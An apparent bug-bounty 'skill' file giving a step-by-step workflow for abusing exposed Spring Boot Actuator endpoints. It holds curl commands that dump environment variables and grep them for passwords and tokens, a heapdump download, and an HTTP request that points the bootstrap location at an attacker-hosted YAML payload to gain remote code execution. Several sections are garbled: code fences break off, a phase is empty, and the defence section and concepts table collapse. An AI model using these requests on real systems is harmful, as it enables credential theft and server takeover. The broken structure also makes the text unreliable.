---
name: spring-boot-actuator-abuse
description: >
  Identify and exploit misconfigured Spring Boot Actuator endpoints. This skill covers how to extract 
  sensitive configuration details, heap dumps, environment variables, and ultimately escalating to 
  Remote Code Execution (RCE) via `spring-cloud-starter` vulnerabilities.
domain: cybersecurity
subdomain: bug-hunting
category: Web Vulnerabilities
difficulty: intermediate
estimated_time: "2-4 hours"
mitre_attack:
  tactics: [TA0001, TA0007, TA0006]
  techniques: [T1190, T1005, T1059]
platforms: [web, java]
tags: [spring-boot, actuator, information-disclosure, rce, bug-hunting, java, web-security]
tools: [burp-suite, curl, custom-scripts]
version: "1.0"
author: CyberSkills-Elite
license: Apache-2.0
---

# Spring Boot Actuator Abuse

## When to Use
- When auditing Java Spring Boot applications that expose monitoring and management endpoints (commonly `/actuator`).
- To extract sensitive environment variables, hidden credentials, or potentially achieve RCE when Spring Cloud routing is enabled.


## Prerequisites
- Authorized scope and target URLs from bug bounty program
- Burp Suite Professional (or Community) configured with browser proxy
- Familiarity with OWASP Top 10 and common web vulnerability classes
- SecLists wordlists for fuzzing and enumeration

## Workflow

### Phase 1: Identifying Actuator Endpoints

```bash
# curl -s http://target.com/actuator/ | jq .
curl -s http://target.com/actuator/env | jq .
curl -s http://target.com/actuator/mappings | jq .
```

### Phase 2: Extracting Sensitive Information

```bash
# curl -s http://target.com/actuator/env | grep -i "password\|secret\|key\|token" 

# curl -O http://target.com/actuator/heapdump
jhat heapdump # ```

### Phase 3: RCE via `spring-cloud-starter` (SnakeYAML)

```http
# POST /actuator/env HTTP/1.1
Host: target.com
Content-Type: application/json

{"name":"spring.cloud.bootstrap.location","value":"http://attacker.com/yaml-payload.yml"}

# POST /actuator/refresh HTTP/1.1
Host: target.com
Content-Type: application/json
```

### Phase 4: Exploiting Logstash / Logback Configuration

```bash
# ```

#### Decision Point 🔀
```mermaid
flowchart TD
    A[Discover Actuator ] --> B{Sensitive Exposed ]}
    B -->|Yes| C[Dump Data ]
    B -->|No| D[Check Cloud ]
    D -->|Post Allowed | E[Exploit RCE ]
```


## 🔵 Blue Team Detection & Defense
- **Disable/Restrict Endpoints**: **Network Segmentation**: **Dependency Updates**: Key Concepts
| Concept | Description |
|---------|-------------|
## Output Format
```
Spring Boot Actuator Abuse — Assessment Report
============================================================
Target: [Target identifier]
Assessor: [Operator name]
Date: [Assessment date]
Scope: [Authorized scope]
MITRE ATT&CK: [Relevant technique IDs]

Findings Summary:
  [Finding 1]: [Severity] — [Brief description]
  [Finding 2]: [Severity] — [Brief description]

Detailed Results:
  Phase 1: [Phase name]
    - Result: [Outcome]
    - Evidence: [Screenshot/log reference]
    - Impact: [Business impact assessment]

  Phase 2: [Phase name]
    - Result: [Outcome]
    - Evidence: [Screenshot/log reference]
    - Impact: [Business impact assessment]

Risk Rating: [Critical/High/Medium/Low/Informational]
Recommendations:
  1. [Immediate remediation step]
  2. [Long-term hardening measure]
  3. [Monitoring/detection improvement]
```


## 💰 Industry Bounty Payout Statistics (2024-2025)

| Company/Platform | Total Paid | Highest Single | Year |
|-----------------|------------|---------------|------|
| **Google VRP** | $17.1M | $250,000 (CVE-2025-4609 Chrome sandbox escape) | 2025 |
| **Microsoft** | $16.6M | (Not disclosed) | 2024 |
| **Google VRP** | $11.8M | $100,115 (Chrome MiraclePtr Bypass) | 2024 |
| **HackerOne (all programs)** | $81M | $100,050 (crypto firm) | 2025 |
| **Meta/Facebook** | $2.3M | up to $300K (mobile code execution) | 2024 |
| **Crypto.com (HackerOne)** | $2M program | $2M max | 2024 |
| **1Password (Bugcrowd)** | $1M max | $1M (highest Bugcrowd ever) | 2024 |
| **Samsung** | $1M max | $1M (critical mobile flaws) | 2025 |

**Key Takeaway**: Google alone paid $17.1M in 2025 — a 40% increase YoY. Microsoft paid $16.6M.
The industry is paying more, not less. Average critical bounty on HackerOne: $3,700 (2023).


## 📚 Shared Resources
> For cross-cutting methodology applicable to all vulnerability classes, see:
> - [`_shared/references/elite-chaining-strategy.md`](../_shared/references/elite-chaining-strategy.md) — Exploit chaining methodology and high-payout chain patterns
> - [`_shared/references/elite-report-writing.md`](../_shared/references/elite-report-writing.md) — HackerOne-optimized report writing, CWE quick reference
> - [`_shared/references/real-world-bounties.md`](../_shared/references/real-world-bounties.md) — Verified disclosed bounties by vulnerability class

## References
- HackTricks: [Spring Boot Penetration Testing](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/spring-boot)
- Veracode: [Exploiting Spring Boot Actuators](https://www.veracode.com/blog/research/exploiting-spring-boot-actuators)
